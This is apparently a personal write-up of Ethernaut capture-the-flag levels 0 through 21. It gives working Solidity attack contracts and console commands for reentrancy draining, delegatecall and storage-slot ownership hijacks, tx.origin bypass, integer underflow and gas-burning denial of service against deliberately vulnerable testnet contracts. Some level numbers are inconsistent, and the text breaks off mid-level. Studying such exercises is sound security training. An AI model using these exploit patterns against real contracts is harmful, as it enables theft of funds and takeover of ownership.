## Ethernaut Level 0: Hello Ethernaut

## Commands Used

### 1. Called info() to get the initial clue
```
await contract.info()
```
**Output:**  
`"You will find what you need in info1()."`

This was the first hint given in the level.

---

### 2. Inspected the contract object
```
await contract
```
To check what functions are available in the contract. I noticed a password() function.

---

### 3. Retrieved the password
```
await contract.password()
```
**Output:**  
`"ethernaut0"`

This is the password needed for authentication.

---

### 4. Submitted the password directly
```
await contract.authenticate(await contract.password())
```
**Output:**  
Transaction successful

### 5. Clicked "Submit Instance"  
Level completed 

## Output Proof
![Level Complete Output](assets/Hello_Ethernaut.png)
![2](assets/Hello_Ethernaut(1).png)


# Ethernaut Level 1: Fallback

##  Strategy

The fallback function in this contract sets msg.sender as the new owner only if:
1. The caller sends ETH to the contract and
2. The caller has already contributed some ether via the contribute() function.

Also, the initial owner starts with `1000 ether` in contributions, so our total contribution must exceed that to trigger ownership update via contribute(). 

---

## Commands Used

### 1. Contributed a small amount to initialize `contributions[msg.sender] > 0`
```
await contract.contribute({value: toWei("0.0005")})
```
Enables the fallback function condition `contributions[msg.sender] > 0`.

---

### 2. Sent ETH directly to the contract to trigger the fallback function
```
await web3.eth.sendTransaction({from: player, to: contract.address, value: web3.utils.toWei("0.0001", "ether")})
```
This calls the `receive()` function, which sets me as the new `owner` since I already had a contribution.

---

### 3. Called `withdraw()` to drain the balance
```
await contract.withdraw()
```
Now that I’m the owner, I can withdraw the contract’s balance and fulfill the final objective.

---

### 4. Level completed

![Level Complete Output](assets/Fallback.png)


# Ethernaut Level 2: Fallout

## Strategy

- **Vulnerability**: The constructor in this contract is incorrectly named `Fal1out`. In Solidity versions prior to 0.7.0, the constructor should match the contract's name.
- **Exploit**: Since `Fal1out()` is a public function , anyone can call it. By calling `Fal1out()`, I was able to set myself as the contract's owner.

---

## Commands Used

### 1. Called the misnamed constructor to claim ownership
```
await contract.Fal1out()
```
This allowed me to set myself as the owner of the contract, as it was not treated as a constructor but a regular public function.

---

### 2. Verified ownership
```
await contract.owner()
```
I got my address as the output, confirming that I am now the owner of the contract

To check that I successfully became the owner after calling `Fal1out()`.

---

## Level completed

![Level Complete Output](assets/Fallout.png)


# Ethernaut Level 3: Coin Flip

## Strategy

In this challenge, the `CoinFlip` contract simulates a coin flip by using the previous block's hash, which is not truly random. This hash can be predicted using the `blockhash()` function, making it possible to determine the outcome of the coin flip in advance.

---

## Commands Used

### 1. Get the contract instance address
```
await contract.address
```
This command was used to get the address of the deployed `CoinFlip` contract

---

### 2. Query the `consecutiveWins` after each successful guess
```
await contract.consecutiveWins()
```
I used this command 10 times to check the `consecutiveWins` value after each flip. Each time the guess was correct, the value increased, and I confirmed that the counter reached 10.

---

## Level completed
![Level Complete Output](assets/Coin_Flip.png)
![2](assets/Coin_Flip(1).png)


# Ethernaut Level 4: Telephone

## Strategy

In this challenge, the `Telephone` contract has a function `changeOwner()` that allows the owner to be changed under certain conditions. The key condition here is that the contract checks whether the transaction origin (`tx.origin`) is different from the caller's address (`msg.sender`). This check is the key vulnerability, as it allows an attacker to use an intermediate contract to manipulate the `tx.origin` value and bypass the owner check.

### Steps:
1. **Understanding the Vulnerability**: The `tx.origin` is the address that initiated the transaction, and it will be different from the contract address when the contract is called by another contract. This condition allows the ownership to be transferred by a contract calling the `changeOwner()` function.
2. **Exploiting the Vulnerability**: I wrote an intermediate contract that calls the `changeOwner()` function of the target `Telephone` contract, passing the contract’s address (`msg.sender`) to satisfy the condition and change the owner of the `Telephone` contract.

---

## Commands Used

### 1. Creating an Interface to Interact with the `Telephone` Contract
```
interface ITelephone {
  function changeOwner(address _owner) external;
}
```
I created an interface (`ITelephone`) to interact with the `Telephone` contract. This allows me to call the `changeOwner()` function on the contract from another contract.

---

### 2. Intermediate Contract to Exploit the Vulnerability
```
contract IntermediateContract {
  function changeOwner(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}
```
This contract acts as an intermediary. It calls the `changeOwner()` function of the target `Telephone` contract, passing the caller's address (`msg.sender`) as the new owner. Since the check `tx.origin != msg.sender` is bypassed, the ownership is transferred successfully.

---

### Explanation of the Exploit:
- The `Telephone` contract uses `tx.origin` to restrict who can change the owner. `tx.origin` refers to the original address that initiated the transaction, and in this case, it checks if the transaction origin is not the same as the caller.
- By using an intermediate contract, I bypassed this check because `msg.sender` (the contract address) is different from `tx.origin` (my address). The intermediate contract successfully called the `changeOwner()` function, transferring the ownership of the `Telephone` contract to my address.

### 3. Executing in Remix IDE
After deploying both the `Telephone` contract and the `IntermediateContract` on Remix IDE, I called the `changeOwner()` function on the intermediate contract to transfer ownership of the `Telephone` contract to my address.

---

### 4. **Query the ownership to confirm the change:**

```
await contract.owner()
```

## Level completed
![Level Complete Output](assets/Telephone.png)


# Ethernaut Level 5: Token

## Strategy

- **Vulnerability**: The `transfer` function in the contract does not safely check for underflows. It subtracts the transfer amount from the sender’s balance before performing the check, and since the Solidity version is ^0.6.0 (before built-in overflow checks), this leads to an integer underflow vulnerability.
- **Exploit**: By trying to transfer more tokens than I actually had (21 tokens when I only had 20), the subtraction underflows and sets my balance to a very large number, allowing me to pass the level.

---

## Commands Used

### 1. Get the contract instance
```
let instance = await contract;
```
To interact with the deployed Token contract instance.

---

### 2. Called the `transfer` function with more than 20 tokens
```
await instance.transfer("0x0000000000000000000000000000000000000001", 21);
```
This triggers the underflow vulnerability and results in a huge balance increase for the player.

---

### 3. Checked the player’s balance
```
(await instance.balanceOf(player)).toString();
```
To verify that my token balance is now much larger than the original 20 tokens.

---

## Level completed
![Level Complete Output](assets/Token.png)



# Ethernaut Level 6: Delegation

## Strategy

- **Vulnerability**: The `Delegation` contract has a `fallback()` function that uses `delegatecall` to forward all unknown calls to the `Delegate` contract. Since `delegatecall` runs in the context of the calling contract’s storage, executing the `pwn()` function from `Delegate` via `delegatecall` will modify `Delegation`'s `owner` instead.
- **Exploit**: By sending a transaction directly to `Delegation` with the function selector for `pwn()`, we can trick the fallback into calling `Delegate.pwn()` and thus take over ownership.

---

## Commands Used

### 1. Get the instance address
```
contract.address
```
To confirm the deployed contract's address.

---

### 2. Set the instance variable to contract address
```
let instance = "0xinstance_address";
```
To specify the instance we are attacking.

---

### 3. Get the player’s account
```
let player = (await web3.eth.getAccounts())[0];
```
To get the sender address (your player address).

---

### 4. Send the function selector of `pwn()` to the contract
```
await web3.eth.sendTransaction({
  from: player,
  to: instance,
  data: "0xdd365b8b"
});
```
`"0xdd365b8b"` is the function selector for `pwn()`. Sending this directly invokes the fallback in `Delegation`, which performs a delegatecall to `Delegate.pwn()`—setting `msg.sender` (player) as the new `owner`.

---

### 5. Check if ownership has changed
```
await contract.owner()
```
To verify that the `owner` is now the player.

---

## Level completed
![Level Complete Output](assets/Delegation.png)


# Ethernaut Level 7: Force

## Strategy

- **Vulnerability**: The `Force` contract does not implement either `receive()` or `fallback()` functions, which means it rejects any direct transfer of ETH using `send()`, `transfer()`, or even `call{value: ...}`.
- **Exploit**: We bypass this restriction by using the `selfdestruct()` function in another contract. When a contract self-destructs, it forcibly sends its balance to the specified address, regardless of whether that address can normally receive ETH. This allows us to inject ETH into `Force`.

---

## Commands Used

### 1. Create an attack contract with `selfdestruct`
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function destroy(address payable _target) public {
        selfdestruct(_target);
    }
}
```
The `destroy()` function will forcefully send ETH to the `Force` contract's address.

---

### 2. Deployed `ForceAttack` with 1 Wei

To give the contract some balance that it can push to the target via `selfdestruct`.

---

### 3. Call the `destroy()` function with the Force instance address
```
await contract.destroy("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
```
To execute `selfdestruct` and force ETH into the `Force` contract.

---

### 4. Confirm the contract balance is now greater than 0
```
await web3.eth.getBalance("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
```
This confirms the ETH was successfully transferred and the level is complete.

---

## Level completed
![Level Complete Output](assets/Force.png)

# Ethernaut Level 8: Vault

## Strategy

- **Vulnerability**: Although the password is marked as `private`, Solidity stores all contract storage on-chain and it can be read using `web3.eth.getStorageAt`. The `password` is located at storage slot 1.
- **Exploit**: We read the private storage directly from the contract, extract the password, and use it to call the `unlock()` function to set `locked = false`.

---

## Commands Used

### 1. Get the password from storage slot 1
```
await web3.eth.getStorageAt(instance, 1)
```
The password is stored at slot 1. This reveals the raw `bytes32` value.

---

### 2. Decode the password to readable ASCII
```
web3.utils.hexToAscii("0x...")  // Use the result from the previous step
```
**Output**: `"A very strong secret password : )"`

---

### 3. Convert the password back to bytes32 format
```
let password = web3.utils.asciiToHex("A very strong secret password : )");
```
The contract's `unlock()` function expects a `bytes32` argument, so the string needs to be converted back.

---

### 4. Unlock the vault
```
await contract.unlock(password);
```

---

### 5. Check if the vault is unlocked
```
await contract.locked();
```
**Output**: `false`

---

## Level completed
![Level Complete Output](assets/Vault.png)


# Ethernaut Level 9: King

## Strategy

- **Vulnerability**: The `King` contract relied on sending Ether to the previous king using `.transfer()`. If the previous king was a smart contract that reverted in its `receive()` function, the transaction would fail, and the new king couldn’t be replaced — effectively locking the contract.
- **Exploit**: I deployed a malicious contract (`KingAttack`) that:
  1. Sent more Ether than the current `prize` to claim kingship.
  2. Reverted any future Ether transfers via its `receive()` function.
- **Outcome**: When Ethernaut’s level logic attempted to reclaim kingship, it failed due to the revert, and I remained the king — completing the level.

---

## Commands Used

### 1. Checked the current balance of the King contract
```
(await web3.eth.getBalance("0x72DF418D0D0F0A30625aB7F6cCE70eA7218b2168")).toString()
```
I used this command to find the current `prize` amount, so I could send a higher amount and become the new king.

**Output**: `"1000000000000000"` (1,000,000,000,000,000 wei)

---

### 2. Deployed the `KingAttack` contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address public target;

    constructor(address _target) payable {
        target = _target;
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    receive() external payable {
        revert("Nope!");
    }
}
```

**Deployment Parameters**:
- Target address: the `King` contract instance address.
- Value sent: `1,100,000,000,000,000 wei` (more than the current prize).

**Reason**:  
I used the constructor to immediately send Ether to the King contract and claim the throne. The `receive()` function reverted any further Ether transfers, preventing anyone — including the level itself — from dethroning my contract.

---

### 3. Verified kingship
```
await contract._king();
```

I used this to confirm that my `KingAttack` contract had become the new king.

**Output**: Address of the `KingAttack` contract

---

## Level Completed
![Level Complete Output](assets/King.png)

# Ethernaut Level 10: Re-entrancy

## Strategy

- **Vulnerability**: The `Reentrance` contract allowed a re-entrant call to `withdraw()` *before* updating the user's balance, due to calling `msg.sender.call.value()` first. This made it vulnerable to **reentrancy attacks**.
- **Exploit**: I wrote and deployed a malicious contract (`ReentranceAttack`) that:
  1. Donated a small amount of Ether to itself in the target contract.
  2. Called `withdraw()` which triggered the fallback `receive()` function.
  3. The `receive()` function recursively called `withdraw()` again, draining the contract before the balance was updated.
- **Outcome**: I successfully drained all funds from the target contract and completed the level.

---

### Prepared the `ReentranceAttack` Contract

I created a new file called `ReentranceAttack.sol` in Remix and pasted the following code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address payable public target;
    address public owner;

    constructor(address _targetAddress) public {
        target = payable(_targetAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send some ETH");
        IReentrance(target).donate{value: msg.value}(address(this));
        IReentrance(target).withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance > 0) {
            uint256 withdrawAmount = targetBalance > 0.001 ether ? 0.001 ether : targetBalance;
            IReentrance(target).withdraw(withdrawAmount);
        }
    }

    function withdrawFunds() public {
        require(msg.sender == owner, "Not owner");
        msg.sender.transfer(address(this).balance);
    }
}
```

---

### Compiled the Contract

- I used Solidity compiler version `0.6.12` to match the version used by the level.
- Clicked **Compile ReentranceAttack.sol**.

---

### Deployed the Attack Contract

- Switched to **Injected Web3** in Remix (connected to Sepolia testnet via MetaMask).
- Provided the **instance address of the Reentrance contract** as the constructor argument.
- Deployed the contract with `0.001 ETH`.

---

### Executed the Attack

- Called the `attack()` function with `0.001 ETH`.
- The attack recursively called `withdraw()` through the fallback `receive()` function, draining the contract balance.

To monitor the balance of the target contract, I ran:
```
(await web3.eth.getBalance(instance)).toString()
```
Once the balance reached `0`, I confirmed the attack was successful.

---

### Step 6: Submitted the Level

- After confirming the contract’s balance was `0`, I submitted the level on Ethernaut — and it was marked complete.

---

## Level Completed
![Level Complete Output](assets/Re-entracy.png)
![Level Complete Output](assets/Re-entrancy(1).png)


# Ethernaut Level 11: Elevator

## Strategy

- **Vulnerability**: The `Elevator` contract relies on an external `Building` contract's `isLastFloor()` function, calling it **twice** — once in an `if` condition and again to set `top`. Since both calls are made separately, the return values don’t have to be the same, creating a logic loophole.
- **Exploit**: I created a contract (`ElevatorHack`) that:
  1. Implements the `Building` interface.
  2. Returns `false` on the first call to `isLastFloor()`, and `true` on the second call — using a toggle variable.
- **Outcome**: This tricks the `Elevator` into thinking it's not on the last floor, then immediately believing it is — allowing me to set `top = true` and complete the level.

```
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract ElevatorHack is Building {
    bool public toggle;
    Elevator public target;

    constructor(address _target) {
        target = Elevator(_target);
        toggle = true;
    }

    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle; // returns false first, then true
        return toggle;
    }

    function attack() public {
        target.goTo(1);
    }
}
```

---

### Compiled the Contract

- I used the Solidity compiler version `^0.8.0` to match the challenge.
- Clicked **Compile ElevatorHack.sol**.

---

### Deployed the Hack Contract

- Switched Remix to **Injected Provider** (MetaMask on Sepolia).
- Passed the instance address of the vulnerable `Elevator` contract into the constructor.
- Deployed `ElevatorHack`.

---

### Triggered the Exploit

- Clicked the `attack()` function in the deployed `ElevatorHack` contract.
- This called `goTo(1)` and toggled the return values of `isLastFloor()` to fake the logic and trick the contract.

---

### Verified the Result

In the browser console, I checked:
```
await contract.top()
```
**→ Output**: `true`

This confirmed that the Elevator believed it had reached the top.

---

## Level Completed
![Level Complete Output](assets/Elevator.png)

# Ethernaut Level 13: Privacy

## Strategy

- **Vulnerability**: Even though the `data` array is marked `private`, Solidity's `private` keyword only restricts access from other contracts—not from external users. Storage slots on the Ethereum blockchain are publicly accessible.
- **Exploit**: The third element of the private `bytes32[3] data` array (i.e., `data[2]`) is stored in storage slot `5`. By reading this slot and slicing the first 16 bytes (`bytes16`), I was able to extract the key used in the `unlock()` function.

---

## Commands Used

### 1. Read the value in storage slot 5
```
await web3.eth.getStorageAt(contract.address, 5)
```
`data[2]` is stored in slot 5. I used this to retrieve the 32-byte value that contains the unlock key.

---

### 2. Extract the unlock key from the retrieved bytes32
```
let full = '0xe29b4ed9fbfba303b84c498c7a45d399f864637ae28408665a60ce4592daf628';
let key = '0x' + full.slice(2, 34);
```
I took the first 16 bytes from the `bytes32` value (i.e., 32 hex characters) to form the `bytes16` key required by the `unlock()` function.

---

### 3. Unlock the contract
```
await contract.unlock(key);
```
This call triggered the `unlock()` function and passed the correct key, changing `locked` to `false`.

---

### 4. Confirm that the contract was unlocked
```
await contract.locked();
```
**Output**: `false`

This confirmed that the level was successfully completed.

---

## Level Completed
![Level Complete Output](assets/Privacy.png)


# Ethernaut Level 14: Gatekeeper One

## Strategy

- **Vulnerability**: The contract has three tricky gates:
  1. **Gate One** requires the `msg.sender` to be different from `tx.origin`, meaning we must call it through a contract.
  2. **Gate Two** requires `gasleft() % 8191 == 0`. This needs brute-forcing different gas values.
  3. **Gate Three** involves carefully crafting a `bytes8` key that matches three constraints involving the caller's address and bit-level properties.

- **Exploit**: I created an attacking contract to:
  - Satisfy Gate One by calling the function through a contract.
  - Brute-force the gas for Gate Two.
  - Generate a key that satisfies all parts of Gate Three.

---

## Commands Used

### 1. Deploy the attack contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneHack {
    function attack(address target) public {
        bytes8 key = bytes8(
            uint64(uint16(uint160(tx.origin))) | (uint64(1) << 32)
        );

        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = target.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
    }
}
```
This attack contract automates the solution to all three gates by constructing a valid key and looping through gas values.

---

### 2. Call the attack function
```
await attacker.attack(contract.address)
```
This executes the attack on the `GatekeeperOne` contract instance, attempting to register my address as the `entrant`.

---

### 3. Confirm level completion
```
await contract.entrant()
```
**Output**: My wallet address (tx.origin)

If the value returned is the wallet address, then we've have successfully passed all gates and completed the level.

---

## Level Completed
![Level Complete Output](assets/gatekeeper1.png)


# Ethernaut Level 15: Gatekeeper Two

## Strategy

- **Vulnerability**:
  1. **Gate One**: Requires the call to originate from a contract (`msg.sender != tx.origin`).
  2. **Gate Two**: Requires the caller contract’s code size to be 0, which only happens **during its constructor**.
  3. **Gate Three**: A bitwise XOR trick – the key must satisfy:
     ```solidity
     uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ _gateKey == 0xFFFFFFFFFFFFFFFF
     ```
     So, `_gateKey = keccak256(msg.sender) ^ max(uint64)`.

- **Exploit**: I deployed a contract that:
  - Calculates the correct `_gateKey` using its own address and XOR,
  - Calls `enter()` from the constructor to ensure `extcodesize == 0`,
  - Uses itself (a contract) to bypass `msg.sender != tx.origin`.

---

## Commands Used

### 1. Attack Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address target) {
        IGatekeeperTwo gate = IGatekeeperTwo(target);

        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        );

        gate.enter(key); // Called from constructor
    }
}
```
This contract satisfies all three gate conditions when deployed.

---

### 2. Check if level is solved
```
await contract.entrant()
```
If it returns my wallet address, I successfully passed all gates and completed the level.

---

## Level Completed
![Level Complete Output](assets/GateKeeper2.png)


# Ethernaut Level 6: NaughtCoin

## Strategy

- **Vulnerability**: The `transfer()` function is restricted for the original player address by a 10-year time lock through the `lockTokens` modifier.
- **Exploit**: The contract only overrides `transfer()` — it does **not** restrict `transferFrom()`. According to the ERC-20 standard, if a user has approved another address (or themselves), that address can call `transferFrom()` without being subject to the `transfer()` restrictions.
- **Goal**: Use `approve()` and `transferFrom()` to bypass the lock and move all tokens out of the player’s account, reducing the balance to 0.

---

## Commands Used

### 1. Approve self to spend the full balance
```
await contract.approve(player, await contract.balanceOf(player))
```
Grants the player permission to transfer their own tokens using `transferFrom()`.

---

### 2. Check allowance to confirm
```
(await contract.allowance(player, player)).toString()
```
Verifies that the approval was successful and matches the token balance.

---

### 3. Use `transferFrom()` to bypass lock and move tokens
```
await contract.transferFrom(player, "0xYourAddress", await contract.balanceOf(player))
```
This call is not gated by `lockTokens`, so it successfully transfers the full balance.

---

### 4. Confirm balance is 0
```
(await contract.balanceOf(player)).toString()
```
If the balance is `0`, the level is successfully completed.

---

## Level Completed
![Level Complete Output](assets/naughtcoin.png)


# Ethernaut Level 16: Preservation

## Strategy

- **Vulnerability**: The `Preservation` contract uses `delegatecall` to external libraries. Because `delegatecall` preserves the calling contract's storage, it's possible to overwrite the `owner` variable if the malicious contract mimics the original storage layout.
- **Exploit**: 
  - Use the `setFirstTime()` function to overwrite `timeZone1Library` with the address of a malicious contract.
  - Then use `setFirstTime()` again, which triggers a `delegatecall` to our malicious `setTime()` and overwrites the `owner`.

---

## Remix Deployment Steps

### 1. Deploy the `Hack` contract in Remix

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        // Step 1: Overwrite timeZone1Library with this contract
        target.setFirstTime(uint256(uint160(address(this))));
        // Step 2: Call again to overwrite owner
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
```

This contract mimics the storage layout of `Preservation` and uses `delegatecall` to hijack ownership.

---

### 2. Call `attack()` with the target `Preservation` contract address

```
hack.attack("0xPreservationContractAddress")
```

Executes the two-step overwrite of `timeZone1Library` and then `owner`.

---

### 3. Verify Ownership Change

```
await contract.owner()
```

**Expected Output**:Your wallet address, proving the hack was successful.

---

## Level Completed
![Level Complete Output](assets/level16-preservation-success.png)


# Ethernaut Level 17: Recovery

## Strategy

- **Vulnerability**: The `Recovery` contract deploys `SimpleToken` contracts using the `new` keyword. These contracts store Ether and have a public `destroy()` method that calls `selfdestruct()`, allowing anyone to remove the Ether.
- **Exploit**: 
  - Since the token contract was created as the first child of the `Recovery` contract, we can calculate its address deterministically using `CREATE` address derivation.
  - Once we recover the address, we call its `destroy()` method and pass our own wallet to drain the Ether.

---

## Remix Deployment Steps

### 1. Deploy the helper `Dev` contract in Remix

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dev {
    function recover(address sender) external pure returns (address) {
        // Derive contract address using keccak256 of the RLP encoding
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            sender,
            bytes1(0x01) // nonce = 1 for the first contract created
        )))));
    }
}
```

This contract calculates the lost token contract address using Ethereum's `CREATE` address derivation method.

---

### 2. Call `recover()` with the address of the `Recovery` contract

```
dev.recover("0xRecoveryContractAddress")
```

Get the address of the `SimpleToken` that was deployed via the `Recovery` contract.

---

### 3. Interact with the recovered token address in Remix

Load the `SimpleToken` contract using the recovered address and call:

```
destroy(payable("yourWalletAddress"))
```

Triggers `selfdestruct()` to send the 0.001 ETH to your wallet.

---

### Success Check

After calling `destroy()`, check your wallet balance or ensure the contract no longer holds ETH.

---

## Level Completed
![Level Complete Output](assets/level17-recovery-success.png)


# Ethernaut Level 18: MagicNumber

## Strategy

- **Vulnerability**: The `MagicNum` contract allows setting an external contract (`solver`) that returns a hardcoded `uint256` value. The catch is the Solver contract must be at most 10 EVM opcodes in size.
- **Exploit**: 
  - Write raw bytecode directly instead of using Solidity (which produces too much overhead).
  - The runtime code simply returns the value `42` (0x2a).
  - Construct init code manually to deploy the runtime code using a contract creation transaction.

---

## Opcode Breakdown

### Runtime Bytecode (10 bytes)
This is the actual logic that gets executed when the `solver` contract is called.

| Opcode | Meaning                        |
|--------|--------------------------------|
| 602a   | PUSH1 0x2a (value 42)          |
| 6050   | PUSH1 0x50 (mem pos 0x50)      |
| 52     | MSTORE                         |
| 6020   | PUSH1 0x20 (length = 32 bytes) |
| 6050   | PUSH1 0x50 (same mem pos)      |
| f3     | RETURN                         |

Final Runtime: `602a60505260206050f3` (10 bytes)

---

### Init Code (Setup code)
This is the code run during deployment to install the runtime code above in the new contract.

| Opcode | Meaning                                  |
|--------|------------------------------------------|
| 600a   | PUSH1 0x0a (size of runtime)             |
| 600c   | PUSH1 0x0c (offset to runtime code)      |
| 6000   | PUSH1 0x00 (dest in memory)              |
| 39     | CODECOPY                                 |
| 600a   | PUSH1 0x0a (size of runtime)             |
| 6000   | PUSH1 0x00 (mem pos of runtime code)     |
| f3     | RETURN                                   |

Final Init Code: `600a600c600039600a6000f3` (12 bytes)

---

### Final Bytecode (22 bytes total)

```
600a600c600039600a6000f3602a60505260206050f3
```

### 1. Deploy Contract from Raw Bytecode

Open the browser console on the Ethernaut level page and paste:

```
// This is the raw bytecode of a minimal contract that returns 42 (0x2a) when called.
const bytecode = "0x600a600c600039600a6000f3602a60505260206050f3";

// Sends a transaction to deploy the contract with that bytecode.
// `player` is your Ethereum address. The contract is deployed by sending this bytecode with no to-address.
const tx = await web3.eth.sendTransaction({ from: player, data: bytecode });

// The deployed contract's address is stored here.
// We'll use it to register this contract as the solver.
const solverAddr = tx.contractAddress;

// Sets the deployed contract as the solver in the MagicNum contract.
await contract.setSolver(solverAddr);
```

The `MagicNum` level requires setting a contract that returns the value `42` using fewer than 10 EVM opcodes. This bytecode accomplishes that efficiently without using Solidity.

---

### 2. Set the Solver Address in MagicNum

```
await contract.setSolver(solverAddr);
```
- This line explicitly sets the address of the deployed contract (which returns 42) as the `solver` expected by `MagicNum`.

---

### 3. Submitted the instance

## Level Completed
![Level Complete Output](assets/magicnumber.png)


# Ethernaut Level 19: AlienCodex

## Strategy

- **Objective**: Claim ownership of the `AlienCodex` contract.
- **Vulnerability**: The `retract()` function causes an underflow in the dynamic array `codex`, extending its length to the entire 2²⁵⁶ storage space of the contract. This lets me overwrite any storage slot—including slot `0`, which holds the `owner` address.
- **Approach**:
  1. Trigger the `contacted` modifier using `makeContact()`.
  2. Exploit the underflow bug via `retract()`.
  3. Calculate the array index `i` that maps to slot `0`.
  4. Use `revise(i, content)` to overwrite the `owner` variable with my own address.

---

## Understanding the Storage Layout

| Slot         | Content                              |
|--------------|--------------------------------------|
| 0            | `owner` (20 bytes) + `contact` (1 byte) |
| 1            | `codex.length`                       |
| keccak256(1) | Start of `codex` array               |

- The dynamic array `codex` does not start at slot 1—it starts at `keccak256(1)`.
- After causing an underflow in `codex.length`, I was able to write to any slot by finding an index `i` such that:  
  `keccak256(1) + i ≡ 0 mod 2²⁵⁶`  
  ⟶ `i = 2²⁵⁶ - keccak256(1)`

---

### 1. I Enabled the Contacted Modifier

```
await contract.make_contact();
```

This set `contact = true`, so I could use `retract()` and `revise()`.

---

### 2. Caused an Array Underflow

```
await contract.retract();
```

This changed `codex.length` from 0 to `2^256 - 1`, making the array span all of contract storage.

---

### 3. Calculated the Slot Offset

```
const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
// Output: '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'

const i = BigInt(2n ** 256n) - BigInt(p);
// Output: 35707666377435648211887908874984608119992236509074197713628505308453184860938n
```

This index maps directly to storage slot `0`.

---

### 4. Prepared the Payload to Overwrite Owner

```
const content = '0x' + '0'.repeat(24) + player.slice(2);
// Output: '0x000000000000000000000000<player_address>'
```

Padded my address with 12 bytes of `0x00` to form a 32-byte `bytes32` value.

---

### 5. Overwrote the Owner Variable

```
await contract.revise(i, content);
```

This wrote the padded player address into slot `0`, overwriting the contract's `owner`.

---

### Level Completed

```
await contract.owner() === player; // true
```

Verified ownership and submitted the instance.

![Level Complete Output](assets/aliencodex.png)


# Ethernaut Level 20: Denial

## Strategy

- **Vulnerability**: The `Denial` contract sends ETH to `partner` using a low-level `call` without a gas limit or checking for success.
- **Exploit**:
  - Created a contract (`GasBurner`) with a `receive()` function that runs an infinite loop until all gas is consumed.
  - Set this malicious contract as the `partner`.
  - Any future `withdraw()` calls by the owner would now consume all gas before reaching `owner.transfer(...)`, causing the transaction to fail under the 1M gas cap.
  - This denial of service meets the level requirement, completing it without calling `withdraw()` myself.

---

## Vulnerability Summary

```
partner.call{value: amountToSend}(""); // No gas limit specified
```

- Sends all remaining gas to the partner.
- If the partner burns enough gas, the remaining operations in `withdraw()` (like `transfer()`) can’t execute.
- Effectively blocks the owner from withdrawing if `gasUsed >= 1M`.

---

## Exploit Steps

### 1. Deployed the GasBurner Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GasBurner {
    uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
```

- The `receive()` function runs a loop until `gasleft()` is zero, consuming all gas sent with the call.

---

### 2. Set `GasBurner` as the Withdrawal Partner

```
await contract.setWithdrawPartner("<gas-burner-address>");
```

- Now, any call to `withdraw()` will invoke `GasBurner.receive()`, consuming all gas and preventing `owner.transfer(...)`.

---

### Level Completed

**did not call** `withdraw()` myself — just setting the malicious partner was enough.
The level checks if the owner is blocked from withdrawing under a 1M gas cap.
Submitted the instance, and the level was marked complete.

![Level Complete Output](assets/denial.png)


# Ethernaut Level 21: Shop

## Strategy

- **Vulnerability**: The `Shop` contract calls the `price()` function of the `Buyer` contract **twice**, once for validation and once for assignment, assuming consistent return values from a `view` function.
- **Exploit**:
  - I deployed a custom `Buyer` contract that implements the `price()` function to return different values depending on the `Shop` contract’s `isSold` state.
  - On the first call (inside the `if` condition), `price()` returned the full asking price (≥ 100).
  - On the second call (after `isSold` is set to true), `price()` returned `0`, effectively buying the item for free.

---

## Understanding the Flow

```
if (_buyer.price() >= price && !isSold) {
    isSold = true;
    price = _buyer.price();
}
```

- The `price()` function is called **twice**:
  1. For checking the condition.
  2. For assigning the new value to `Shop.price`.
- Since `price()` is `view`, we cannot track call counts using storage, but we **can check `Shop.isSold()`** to infer which call we're in.

---

## Exploit Steps

### 1. Deployed a Custom `Buyer` Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint);
}

contract Buyer {
    function price() external view returns (uint) {
        bool isSold = IShop(msg.sender).isSold();
        uint askedPrice = IShop(msg.sender).price();

        if (!isSold) {
            return askedPrice; // return 100 during the first call
        }

        return 0; // return 0 during the second call
    }

    function buyFromShop(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
```

---

### 2. Initiated the Purchase

```
await buyerContract.buyFromShop("<shop-instance-address>");
```

- This triggered the two calls to `price()`.
- My contract returned 100 for the first check, and 0 for the assignment after `isSold` was true.

---

### 3. Verified the Exploit

```
